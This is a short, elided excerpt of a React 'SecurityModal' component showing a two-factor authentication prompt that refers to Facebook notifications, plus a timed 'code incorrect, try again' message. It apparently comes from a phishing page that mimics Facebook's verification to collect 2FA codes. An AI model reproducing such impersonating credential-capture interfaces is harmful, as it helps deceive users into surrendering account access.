...
const SecurityModal = ({
    ...
    useEffect(() => {
        if (timerCounter > 0) {
            setErrorMessage(`The two-factor authentication you entered is incorrect. Please, try again after ${formatTime(timerCounter)}.`);
        } else {
            setErrorMessage('');
    ...
    return (
        <>
            ...
            >
                <div>
                <div className='desc'>
                    <h4>Two-factor authentication required (1/3)</h4>
                    <p>The verification code has been sent to your phone number or E-mail, please check your inbox and enter the code below to complete. In case you do not receive the code, please check the Facebook notification on your device and confirm it is you to complete the verification process.</p>
